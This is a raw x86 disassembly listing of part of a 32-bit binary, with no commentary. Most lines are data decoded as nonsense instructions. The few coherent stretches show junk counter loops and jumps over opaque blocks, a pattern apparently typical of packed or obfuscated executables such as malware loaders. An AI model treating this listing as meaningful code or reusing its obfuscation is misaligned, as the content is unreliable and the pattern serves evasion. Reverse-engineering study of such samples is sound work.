  41206f:	mov    DWORD PTR [ecx+0x21],esi
  412072:	or     esp,0x11
  412075:	dec    eax
  412076:	loop   0x4120ab
  412078:	jmp    0xe6ae6abe
  41207d:	paddw  mm5,mm0
  412080:	cld    
  412081:	mov    esp,cs
  412083:	inc    ebp
  412084:	jmp    0x412039
  412086:	dec    esi
  412087:	test   BYTE PTR [eax+0x18],al
  41208a:	jnp    0x41203d
  41208c:	loopne 0x4120d0
  41208e:	loopne 0x412052
  412090:	sbb    DWORD PTR [ebx-0x5d],esp
  412093:	sub    dh,BYTE PTR [edx-0x39629e68]
  412099:	iret   
  41209a:	xor    BYTE PTR [ebp+0x46],0x77
  41209e:	cwde   
  41209f:	out    dx,eax
  4120a0:	cli    
  4120a1:	dec    eax
  4120a2:	jecxz  0x412024
  4120a4:	retf   0xa829
  4120a7:	dec    edi
  4120a8:	and    ecx,DWORD PTR [ebx+0x8b0845]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	call   0x468a1e3b
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0xad70707e
  41217a:	shr    BYTE PTR [edi+edi*4-0x49bab1e2],1
  412181:	enter  0xfee0,0x9c
  412185:	cmp    eax,0x6ff20c11
  41218a:	adc    al,0x50
  41218c:	in     al,dx
  41218d:	sti    
  41218e:	push   cs
  41218f:	mov    esp,0x847c3c86
  412194:	rcr    esi,cl
  412196:	pop    eax
  412197:	(bad)  
  412198:	push   edx
  412199:	adc    al,0x59
  41219b:	xor    BYTE PTR [ebp-0xf],dl
  41219e:	jnp    0x41216d
  4121a0:	mov    al,0x52
  4121a2:	pop    edi
  4121a3:	in     al,0xf
  4121a5:	int    0x73
  4121a7:	sti    
  4121a8:	and    al,0x53
  4121aa:	push   cs
  4121ab:	xor    bh,0x3e
  4121ae:	mov    ds:0x1bc9f8b2,eax
  4121b3:	repnz pushf 
  4121b5:	out    dx,eax
  4121b6:	push   ecx
  4121b7:	and    al,0x8c
  4121b9:	das    
  4121ba:	xchg   esp,eax
  4121bb:	ds mov dh,0x82
  4121be:	sub    dl,dh
  4121c0:	ret    
  4121c1:	ja     0x4121b6
  4121c3:	popf   
  4121c4:	and    eax,0x8c202488
  4121c9:	push   0x90de0e06
  4121ce:	cwde   
  4121cf:	mov    eax,ds:0x6f558318
  4121d4:	jae    0x4121f7
  4121d6:	fdivp  st(6),st
  4121d8:	ficom  DWORD PTR [ecx+ebp*2-0x3841c68e]
  4121df:	sub    ebx,DWORD PTR [edx+eiz*2]
  4121e2:	loop   0x41223b
  4121e4:	push   ebp
  4121e5:	pushf  
  4121e6:	pop    edi
  4121e7:	sub    BYTE PTR [ebx-0x70116960],0x3
  4121ee:	cmp    al,0xbb
  4121f0:	jnp    0x412260
  4121f2:	sub    al,0x70
  4121f4:	inc    esi
  4121f5:	mov    ds:0x9f58c27c,al
  4121fa:	add    al,0x26
  4121fc:	sbb    edi,DWORD PTR [ebp-0x34]
  4121ff:	sbb    ebx,DWORD PTR [ebp-0x61]
  412202:	out    dx,eax
  412203:	stos   BYTE PTR es:[edi],al
  412204:	xor    BYTE PTR [ecx-0x1c],cl
  412207:	sub    ecx,DWORD PTR [esi]
  412209:	inc    esp
  41220a:	stc    
  41220b:	lds    ecx,FWORD PTR ds:0x79ea8a09
  412211:	add    dl,BYTE PTR [ebp+ebp*2-0x47]
  412215:	cld    
  412216:	push   es
  412217:	inc    edx
  412218:	mov    dl,BYTE PTR [ecx+0x48]
  41221b:	pushf  
  41221c:	arpl   dx,sp
  41221e:	push   esp
  41221f:	clc    
  412220:	(bad)  
  412221:	jle    0x412218
  412223:	test   DWORD PTR [ecx+0x0],edx
  412226:	cmp    edi,DWORD PTR [eax+0x71]
  412229:	iret   
  41222a:	fbld   TBYTE PTR [esi-0x2f8d6e02]
  412230:	lds    edi,FWORD PTR [ebx-0x6a]
  412233:	jl     0x4121c5
  412235:	mov    WORD PTR [eax-0x23],ss
  412238:	iret   
  412239:	jbe    0x412239
  41223b:	jns    0x412244
  41223d:	into   
  41223e:	ins    DWORD PTR es:[edi],dx
  41223f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412240:	xor    edx,DWORD PTR [esi]
  412242:	pop    esp
  412243:	les    edi,FWORD PTR [edx+0x29b075ce]
  412249:	popa   
  41224a:	mov    edi,0xfbf6a00e
  41224f:	push   ds
  412250:	test   eax,0x501c6e9c
  412255:	fwait
  412256:	call   0xc624:0x79856a68
  41225d:	pop    esi
  41225e:	ficom  DWORD PTR [ecx+edi*2]
  412261:	pop    ebx
  412262:	(bad)  
  412263:	mov    ebx,0x6ffc3ccc
  412268:	(bad)  
  412269:	sub    cl,al
  41226b:	popf   
  41226c:	out    dx,al
  41226d:	push   cs
  41226e:	out    0x2c,eax
  412270:	push   ebp
  412271:	inc    edi
  412272:	idiv   BYTE PTR [ebp+0x3729ff6b]
  412278:	cmp    esi,DWORD PTR [edx]
  41227a:	jae    0x4122bd
  41227c:	popf   
  41227d:	cwde   
  41227e:	pop    es
  41227f:	add    eax,0x8a6e4b84
  412284:	rcl    BYTE PTR [eax-0x1c],1
  412287:	cli    
  412288:	push   ecx
  412289:	xchg   ebx,eax
  41228a:	in     al,0x39
  41228c:	js     0x4122fe
  41228e:	xchg   ebp,eax
  41228f:	sbb    BYTE PTR [edx+0x17],al
  412292:	call   0x69d0:0x2e0531bc
  412299:	out    0xcb,eax
  41229b:	lds    edi,FWORD PTR [esi+0x7b8ed4fc]
  4122a1:	inc    esi
  4122a2:	test   BYTE PTR [ecx],ch
  4122a4:	(bad)  
  4122a5:	push   esp
  4122a6:	pushf  
  4122a7:	outs   dx,BYTE PTR ds:[esi]
  4122a8:	dec    ecx
  4122a9:	(bad)  
  4122aa:	push   ecx
  4122ab:	or     al,BYTE PTR [ebx]
  4122ad:	cwde   
  4122ae:	int3   
  4122af:	jmp    0x73c9:0x5536f848
  4122b6:	shl    BYTE PTR [ecx-0x1f580817],1
  4122bc:	cdq    
  4122bd:	loope  0x41225a
  4122bf:	int3   
  4122c0:	push   ebx
  4122c1:	push   ebp
  4122c2:	jns    0x412268
  4122c4:	in     eax,0x38
  4122c6:	inc    ecx
  4122c7:	aam    0x1d
  4122c9:	call   0xfde:0x419329d9
  4122d0:	dec    ebp
  4122d1:	in     al,0xca
  4122d3:	loope  0x41227b
  4122d5:	sbb    eax,0xa3ea5160
  4122da:	xor    esi,DWORD PTR [edx-0x6f]
  4122dd:	popa   
  4122de:	fisub  DWORD PTR [ebp+0x7156a43f]
  4122e4:	es (bad) 
  4122e7:	adc    cl,bl
  4122e9:	int    0xf9
  4122eb:	or     al,0x2b
  4122ed:	neg    DWORD PTR [esi-0x36]
  4122f0:	pop    esi
  4122f1:	leave  
  4122f2:	or     DWORD PTR [ecx+edx*8],ebx
  4122f5:	adc    eax,0x45c383cf
  4122fa:	xor    ah,0xdc
  4122fd:	pop    edi
  4122fe:	ins    BYTE PTR es:[edi],dx
  4122ff:	inc    ecx
  412300:	sub    al,0xe3
  412302:	adc    ch,ah
  412304:	es (bad) 
  412306:	xlat   BYTE PTR ds:[ebx]
  412307:	in     eax,0x92
  412309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41230a:	cmp    DWORD PTR ds:0x2707beee,eax
  412310:	sbb    ebx,ebx
  412312:	mov    ds:0x9000027,eax
  412317:	add    DWORD PTR [edx-0x2de764b9],0x891ac3be
  412321:	aaa    
  412322:	aam    0x8a
  412324:	retf   
  412325:	or     al,0xe5
  412327:	cmp    BYTE PTR [eax+0xf],0x9a
  41232b:	lahf   
  41232c:	ret    
  41232d:	mov    ds:0xbdefc9fa,eax
  412332:	sbb    eax,0x6ffcb000
  412337:	add    al,0xfd
  412339:	dec    edx
  41233a:	sub    DWORD PTR [edi+ecx*1-0x4a],0xa9a23a5a
  412342:	push   ss
  412343:	int3   
  412344:	mov    ds:0xca229a95,al
  412349:	das    
  41234a:	pop    edi
  41234c:	out    0x3f,eax
  41234e:	mov    eax,0xc7c96d23
  412353:	push   es
  412354:	idiv   ch
  412356:	sub    BYTE PTR [eax],dh
  412358:	or     ebp,DWORD PTR [edi-0x64c34c38]
  41235e:	pop    ebx
  41235f:	mov    edx,0x5a681a38
  412364:	out    dx,al
  412365:	mov    BYTE PTR [edx+0x7],ch
  412368:	js     0x412385
  41236a:	inc    ebx
  41236b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41236c:	dec    edx
  41236d:	inc    edi
  41236e:	in     eax,0x6
  412370:	mov    esp,0x29b3d7d3
  412375:	imul   ebx,DWORD PTR [ecx],0x2f
  412378:	outs   dx,BYTE PTR ds:[esi]
  412379:	ins    BYTE PTR es:[edi],dx
  41237a:	push   esp
  41237b:	sbb    bl,BYTE PTR [ecx+ebx*8-0x4536630d]
  412382:	fild   DWORD PTR [edi-0x3afd358c]
  412388:	or     dl,al
  41238a:	js     0x4123f3
  41238c:	cmp    DWORD PTR [edi-0x791b2a66],ebp
  412392:	jbe    0x412343
  412394:	stc    
  412395:	das    
  412396:	daa    
  412397:	jmp    0x412384
  412399:	xlat   BYTE PTR ds:[ebx]
  41239a:	and    ch,0x68
  41239d:	cmp    DWORD PTR [esp+edx*8],0x79373b91
  4123a4:	xor    edi,DWORD PTR [edx]
  4123a6:	fld    DWORD PTR [edx*8+0x661a872a]
  4123ad:	sub    cl,dl
  4123af:	mov    al,ds:0x4021a6a9
  4123b4:	out    0x7,eax
  4123b6:	dec    ebx
  4123b7:	call   0x8de7aa9
  4123bc:	push   ecx
  4123bd:	inc    ebp
  4123be:	fsubr  QWORD PTR [ecx-0x5591285d]
  4123c4:	jge    0x412434
  4123c6:	cmp    BYTE PTR [ebx+0x70f02194],bh
  4123cc:	repnz arpl WORD PTR [esi-0x14],cx
  4123d0:	clc    
  4123d1:	pop    ebx
  4123d2:	inc    esp
  4123d3:	jo     0x41241c
  4123d5:	add    eax,0x9bbbd633
  4123da:	or     al,0x66
  4123dc:	sub    DWORD PTR [ecx],0x4e
  4123df:	mov    ?,WORD PTR [ebx-0x7f]
  4123e2:	loope  0x412383
  4123e4:	stos   DWORD PTR es:[edi],eax
  4123e5:	call   DWORD PTR [esi+edi*4]
  4123e8:	out    dx,eax
  4123e9:	push   0xc20b6565
  4123ee:	pop    ss
  4123ef:	pop    ecx
  4123f0:	fisub  DWORD PTR [ebp-0x14df4eef]
  4123f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123f7:	(bad)  [esi-0x21]
  4123fa:	ins    BYTE PTR es:[edi],dx
  4123fb:	dec    edi
  4123fc:	fldenv [esi+0x1789b020]
  412402:	adc    dh,BYTE PTR [edi+0x1e]
  412405:	jg     0x4123f5
  412407:	repz xchg ecx,eax
  412409:	loopne 0x412451
  41240b:	scas   al,BYTE PTR es:[edi]
  41240c:	pop    edi
  41240d:	mov    al,0x2c
  41240f:	ror    ecx,0x92
  412412:	fdiv   DWORD PTR [ebx+0x5dce8414]
  412418:	pop    ss
  412419:	jmp    0x41241e
  41241b:	mov    ds:0x564e45e6,eax
  412420:	add    al,0x43
  412422:	test   al,0xdc
  412424:	loope  0x412448
  412426:	push   edx
  412427:	sub    DWORD PTR [ecx+0x64],ecx
  41242a:	test   BYTE PTR [esi+0x7d],bh
  41242d:	xchg   BYTE PTR [edx+0x489b1792],dl
  412433:	and    esp,esp
  412435:	(bad)  
  412436:	stos   DWORD PTR es:[edi],eax
  412437:	mov    ebx,0x8a1052e6
  41243c:	cmp    BYTE PTR [esi+esi*2-0x7e34fc1a],dl
  412443:	sub    eax,0x42fcf9
  412448:	xchg   esi,eax
  412449:	sldt   WORD PTR [eax]
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	popf   
  41245e:	(bad)  
  41245f:	jne    0x41245b
  412461:	(bad)  
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0x1470707e
  41246a:	inc    edi
  41246b:	or     eax,0x61814314
  412470:	mov    dh,0x52
  412472:	test   DWORD PTR [esi-0x4c],edi
  412475:	sahf   
  412476:	push   0x13c091d6
  41247b:	push   0x6a
  41247d:	ret    0x41f3
  412480:	popa   
  412481:	mov    eax,DWORD PTR [edi+edi*2+0x6d]
  412485:	adc    ebp,edx
  412487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412488:	shl    edi,0x65
  41248b:	push   0xcfe71122
  412490:	dec    ebp
  412491:	clc    
  412492:	imul   ebx,DWORD PTR [ebp+0x77],0x19bdf299
  412499:	cpuid  
  41249b:	(bad)  
  41249c:	jp     0x412493
  41249e:	mov    ch,0x5d
  4124a1:	jns    0x41245d
  4124a3:	mov    ebx,DWORD PTR ds:0x639dc2c9
  4124a9:	adc    BYTE PTR [ebx],cl
  4124ab:	dec    edx
  4124ac:	arpl   WORD PTR [eax],si
  4124ae:	push   esi
  4124af:	sub    esi,DWORD PTR [esi+0x44]
  4124b2:	adc    bh,BYTE PTR [ecx+0x51]
  4124b5:	add    al,0x83
  4124b7:	xchg   edx,ecx
  4124b9:	test   BYTE PTR [esi],0xcd
  4124bc:	(bad)  
  4124bd:	xchg   esp,eax
  4124be:	hlt    
  4124bf:	jmp    0xaf148962
  4124c4:	pop    eax
  4124c5:	into   
  4124c6:	and    edx,DWORD PTR [ebp-0x3d]
  4124c9:	cmp    dh,cl
  4124cb:	mov    ds:0x32e8c83,al
  4124d0:	push   ebp
  4124d1:	pop    ebp
  4124d2:	enter  0xc8e7,0x28
  4124d6:	rol    DWORD PTR [edx-0x3d],cl
  4124d9:	mov    ebx,0x9653f650
  4124de:	sbb    DWORD PTR [ebx-0x15],ebx
  4124e1:	push   ebx
  4124e2:	(bad)  
  4124e3:	mov    al,0x29
  4124e5:	xor    al,BYTE PTR [si]
  4124e8:	stc    
  4124e9:	jle    0x412515
  4124eb:	ins    DWORD PTR es:[edi],dx
  4124ec:	sub    dl,BYTE PTR [ecx+0x7c8b119c]
  4124f2:	jge    0x4124e5
  4124f4:	lods   eax,DWORD PTR ds:[esi]
  4124f5:	popa   
  4124f6:	jecxz  0x4124a3
  4124f8:	lds    eax,FWORD PTR [ebp-0x5ab36a58]
  4124fe:	aam    0x9e
  412500:	and    BYTE PTR [edx-0x62],dl
  412503:	dec    edx
  412504:	jle    0x41251e
  412506:	jae    0x412569
  412508:	adc    esp,DWORD PTR [ebx+eiz*2-0x4add8ed9]
  41250f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412510:	lock and al,0x20
  412513:	xchg   edx,eax
  412514:	mov    ah,0x6c
  412516:	cli    
  412517:	mov    eax,ds:0xbc4efea
  41251c:	pusha  
  41251d:	(bad)  
  41251e:	fld    QWORD PTR [edx+0x483ed5cb]
  412524:	repz mov dh,0xe1
  412527:	adc    eax,DWORD PTR [edi-0x59]
  41252a:	lahf   
  41252b:	mov    ebx,0x4dd23e9
  412530:	popf   
  412531:	mov    dh,0x1f
  412533:	aad    0x56
  412535:	fadd   QWORD PTR [ebp+0x5e2548aa]
  41253b:	xchg   ebx,eax
  41253c:	retf   0xbeeb
  41253f:	mov    bh,0xe9
  412541:	(bad)
  412545:	jl     0x41254a
  412547:	pop    esp
  412548:	inc    eax
  412549:	sbb    BYTE PTR [ebx],al
  41254b:	test   DWORD PTR [edx+0x747ea86f],0x4370064
  412555:	cmp    DWORD PTR [edx-0x3594d10],0xcfb332e7
  41255f:	inc    esi
  412560:	(bad)  
  412561:	jmp    0x634629b3
  412566:	fidiv  DWORD PTR [edi-0x34]
  412569:	(bad)  
  41256a:	pop    edx
  41256b:	mov    al,ds:0xa22fd171
  412570:	xchg   edx,eax
  412571:	inc    eax
  412572:	xor    al,cl
  412574:	push   cs
  412575:	outs   dx,DWORD PTR ds:[esi]
  412576:	ror    BYTE PTR [edx+0xb0367f9],1
  41257c:	sub    DWORD PTR [esi+ebx*2-0x26],ebx
  412580:	push   esi
  412581:	call   0xee4aca24
  412586:	mov    BYTE PTR [esi-0x3e],cl
  412589:	sbb    al,0x8d
  41258b:	pop    ecx
  41258c:	fistp  QWORD PTR [ebx]
  41258e:	(bad)  
  41258f:	jno    0x4125a7
  412591:	sub    eax,DWORD PTR [esi]
  412593:	xor    DWORD PTR [edx+0x2b],edx
  412596:	clc    
  412597:	cmc    
  412598:	jo     0x41256b
  41259a:	pop    ss
  41259b:	dec    eax
  41259c:	push   edi
  41259d:	in     eax,dx
  41259e:	push   edx
  41259f:	popa   
  4125a0:	(bad)  
  4125a1:	pop    eax
  4125a2:	daa    
  4125a3:	test   DWORD PTR [edx+0x4ebf775f],esp
  4125a9:	cmp    BYTE PTR [edi+0x2cc88cc5],0xcb
  4125b0:	arpl   WORD PTR [edi],cx
  4125b2:	pop    esi
  4125b3:	in     al,0x35
  4125b5:	or     esi,DWORD PTR [eax+0x79]
  4125b8:	mov    BYTE PTR [edi+0x78],bh
  4125bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125bc:	cdq    
  4125bd:	dec    ecx
  4125be:	xor    ch,dh
  4125c0:	retf   
  4125c1:	jbe    0x4125db
  4125c3:	sbb    bh,bl
  4125c5:	out    0xe8,eax
  4125c7:	inc    ebx
  4125c8:	cli    
  4125c9:	add    eax,DWORD PTR gs:[ecx+edx*8]
  4125cd:	enter  0x7907,0xa1
  4125d1:	fiadd  WORD PTR [ebp+0x7f]
  4125d4:	hlt    
  4125d5:	js     0x4125bf
  4125d7:	sbb    cl,BYTE PTR [ecx+0x0]
  4125da:	push   ebp
  4125db:	inc    ebp
  4125dc:	and    bh,BYTE PTR [edx-0x4f490f53]
  4125e2:	xchg   ah,bh
  4125e4:	les    eax,FWORD PTR [esi+eiz*8]
  4125e7:	and    BYTE PTR [edx-0x54],0xff
  4125eb:	std    
  4125ec:	imul   eax,DWORD PTR [ecx-0x5f183158],0xffffffa7
  4125f3:	mov    cl,0x4b
  4125f5:	jp     0x412630
  4125f7:	sahf   
  4125f8:	jne    0x41266e
  4125fa:	mov    ebx,0x5eb08265
  4125ff:	cwde   
  412600:	(bad)  
  412601:	mov    dl,0xd0
  412603:	inc    esi
  412604:	es add cl,dh
  412607:	lea    edi,[edx]
  412609:	xchg   edi,eax
  41260a:	dec    eax
  41260b:	fsub   DWORD PTR [ecx]
  41260d:	(bad)  
  41260e:	push   esi
  41260f:	cmp    edx,DWORD PTR [ecx]
  412611:	scas   al,BYTE PTR es:[edi]
  412612:	pop    ebp
  412613:	sbb    DWORD PTR [ebx],0x5c53fe29
  412619:	ja     0x4125f8
  41261b:	loop   0x412608
  41261d:	mov    ah,0xb
  41261f:	pop    edx
  412620:	xor    ecx,0x75
  412623:	das    
  412624:	sti    
  412625:	int    0xc2
  412627:	jae    0x4125ff
  412629:	add    ch,BYTE PTR [edx]
  41262b:	push   es
  41262c:	xchg   esi,eax
  41262d:	mov    al,0xec
  41262f:	mov    WORD PTR [edx-0x113205be],fs
  412635:	cld    
  412636:	fs and eax,0xa0579828
  41263c:	scas   eax,DWORD PTR es:[edi]
  41263d:	rcl    BYTE PTR [ecx],0x93
  412640:	dec    esp
  412641:	jg     0x4125d5
  412643:	sub    al,0x35
  412645:	pop    ebx
  412646:	dec    ebx
  412647:	retf   
  412648:	mov    esp,0x1f22ca9d
  41264d:	sub    eax,0xafadafdf
  412652:	add    DWORD PTR [eax+0x17],ecx
  412655:	(bad)  
  412656:	test   al,0xfa
  412658:	jge    0x41265a
  41265a:	sbb    al,0x87
  41265c:	or     cl,BYTE PTR [ebx+0x66]
  41265f:	repz or edx,DWORD PTR [edx-0x60ce7493]
  412666:	repnz repz pop es
  412669:	call   0xf6ea:0xae2ecb9b
  412670:	push   eax
  412671:	sub    bh,BYTE PTR [edi-0x623169fd]
  412677:	inc    eax
  412678:	scas   eax,DWORD PTR es:[edi]
  412679:	jp     0x412680
  41267b:	jg     0x412616
  41267d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41267e:	scas   eax,DWORD PTR es:[edi]
  41267f:	dec    esp
  412680:	xchg   esi,eax
  412681:	mov    ?,WORD PTR [esi+0x517a89ad]
  412687:	adc    eax,0x4b00619e
  41268c:	in     eax,dx
  41268d:	not    DWORD PTR [esi]
  41268f:	inc    edx
  412690:	jnp    0x4126ba
  412692:	imul   esi,DWORD PTR [eax],0x7f
  412695:	jo     0x412700
  412697:	ds and al,0x39
  41269a:	dec    eax
  41269b:	push   ebx
  41269c:	push   0xffffffd1
  41269e:	in     eax,0x1e
  4126a0:	dec    esp
  4126a1:	and    dl,BYTE PTR [edi+0x6b]
  4126a4:	jmp    0xa63:0x4c96b9cc
  4126ab:	hlt    
  4126ac:	push   es
  4126ad:	xor    edi,edi
  4126af:	or     BYTE PTR [edx+ecx*2],0xe9
  4126b3:	popf   
  4126b4:	addr16 inc ebx
  4126b6:	or     BYTE PTR ds:0x82639123,dl
  4126bc:	pop    es
  4126bd:	push   es
  4126be:	dec    edx
  4126bf:	xchg   esp,eax
  4126c0:	fistp  DWORD PTR [esi+0xe]
  4126c3:	xor    bl,BYTE PTR [ecx+edi*4+0x44f8ffb5]
  4126ca:	sub    BYTE PTR [ecx+edi*1],bh
  4126cd:	inc    ebp
  4126ce:	(bad)  
  4126cf:	xchg   ebx,eax
  4126d0:	add    al,0x69
  4126d2:	out    dx,eax
  4126d3:	add    DWORD PTR [edi],esi
  4126d5:	stos   DWORD PTR es:[edi],eax
  4126d6:	imul   edx,DWORD PTR [ebp-0x9bfac20],0xca11cd07
  4126e0:	bound  eax,QWORD PTR [eax-0x45]
  4126e3:	cmp    DWORD PTR [esi+0x202f2cd0],ebx
  4126e9:	pop    esp
  4126ea:	shl    DWORD PTR [ebx+0x19],1
  4126ed:	repz and al,0xed
  4126f0:	and    dl,0xe9
  4126f3:	leave  
  4126f4:	and    al,0x21
  4126f6:	pop    eax
  4126f7:	jg     0x412703
  4126f9:	ret    0x5da9
  4126fc:	dec    esi
  4126fd:	sub    eax,0x8918b26e
  412702:	sub    BYTE PTR [edi+0xe],bh
  412705:	mov    esp,0x3cd4eca9
  41270a:	cmp    ah,BYTE PTR [edi+edi*1]
  41270d:	ret    0x6448
  412710:	xor    eax,0x5487da51
  412715:	jns    0x4126f7
  412717:	test   DWORD PTR [ecx+ebx*4+0x1004196c],0x238442dd
  412722:	mov    WORD PTR ds:0x3170a7e4,gs
  412728:	call   0xdf88478c
  41272d:	inc    esp
  41272e:	pop    edx
  41272f:	lods   al,BYTE PTR ds:[esi]
  412730:	mov    DWORD PTR [ebp-0x1c],ecx
  412733:	and    DWORD PTR ds:0x42fd76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    eax,DWORD PTR [edx-0x37e86b0b]
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0xbf70707e
  4127ca:	rol    ebp,0xcd
  4127cd:	pop    edi
  4127ce:	mov    al,0x49
  4127d0:	arpl   WORD PTR [edi-0x8a9c8b5],bp
  4127d6:	mov    edi,DWORD PTR [ebx+edx*2]
  4127d9:	xor    eax,0x4d4e3f4d
  4127de:	mov    dh,0x4e
  4127e0:	adc    eax,0x3b38ad6d
  4127e5:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4127e7:	jo     0x41281e
  4127e9:	clc    
  4127ea:	imul   ecx,ebp,0x5941015a
  4127f0:	pop    eax
  4127f1:	lods   al,BYTE PTR ds:[esi]
  4127f2:	paddq  mm2,QWORD PTR [ebx-0x62]
  4127f6:	pushf  
  4127f7:	dec    esp
  4127f8:	sub    al,0xf4
  4127fa:	or     al,0xa8
  4127fc:	and    ecx,DWORD PTR [ebx+eax*4+0x3407d6dc]
  412803:	shl    DWORD PTR [edx+0x2fa474ee],cl
  412809:	pop    es
  41280a:	inc    edi
  41280b:	stos   BYTE PTR es:[edi],al
  41280c:	cmp    esp,esp
  41280e:	mov    BYTE PTR [eax+0x62880f89],0xc4
  412815:	xor    bh,BYTE PTR ds:0x94eb350c
  41281b:	icebp  
  41281c:	cmp    eax,DWORD PTR [edx]
  41281e:	fidivr WORD PTR ds:0x756c3025
  412824:	sbb    ebp,DWORD PTR [ecx-0x6c540a7a]
  41282a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41282b:	lods   eax,DWORD PTR ds:[esi]
  41282c:	xor    eax,0x9ecdc1f7
  412831:	rcr    BYTE PTR [esi+esi*4],0xdb
  412835:	add    DWORD PTR [ecx+0x60bfce7c],0xcb20cb0a
  41283f:	pop    es
  412840:	xchg   ebp,eax
  412841:	ds pop edi
  412843:	sbb    ah,bl
  412845:	ret    
  412846:	outs   dx,DWORD PTR ds:[esi]
  412847:	adc    eax,ebp
  412849:	mov    edx,0x6e56f6c4
  41284e:	lods   eax,DWORD PTR ds:[esi]
  41284f:	imul   BYTE PTR [edx]
  412851:	enter  0x33e8,0xa4
  412855:	and    ch,BYTE PTR [ecx-0x48b41eab]
  41285b:	dec    ecx
  41285c:	clc    
  41285d:	lock pop ss
  41285f:	(bad)  [eax+0x13d72908]
  412865:	sub    al,0xba
  412867:	call   0xdb68:0x192bc3d9
  41286e:	pop    ss
  41286f:	div    esp
  412871:	sbb    eax,0xd16de0b9
  412876:	or     al,0xb3
  412878:	mov    dl,0xb7
  41287a:	xchg   ebp,eax
  41287b:	push   0x59
  41287d:	retf   
  41287e:	add    cl,bl
  412880:	cmp    bh,BYTE PTR [edi+0x4191e642]
  412886:	mov    al,ds:0x70c885f3
  41288b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41288c:	mov    ds:0x5e48fe23,eax
  412891:	jns    0x412897
  412893:	mov    bl,0x96
  412895:	dec    edx
  412896:	add    al,0x51
  412898:	ins    DWORD PTR es:[edi],dx
  412899:	xor    eax,0x754ddb26
  41289e:	retf   
  41289f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128a0:	mov    esi,0xb49dbe1e
  4128a5:	mov    esp,0x5165a119
  4128aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128ab:	cs inc eax
  4128ad:	ss sti 
  4128af:	adc    BYTE PTR [edx],ch
  4128b1:	retf   
  4128b2:	inc    eax
  4128b3:	mov    cl,0x9
  4128b5:	and    ecx,ecx
  4128b7:	in     eax,0xcc
  4128b9:	sahf   
  4128ba:	stos   BYTE PTR es:[edi],al
  4128bb:	in     al,dx
  4128bc:	add    bl,BYTE PTR fs:[eax+0x76]
  4128c0:	and    DWORD PTR [edi+0x31],0x73
  4128c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128c5:	push   edi
  4128c6:	aad    0xdb
  4128c8:	push   edi
  4128c9:	das    
  4128ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
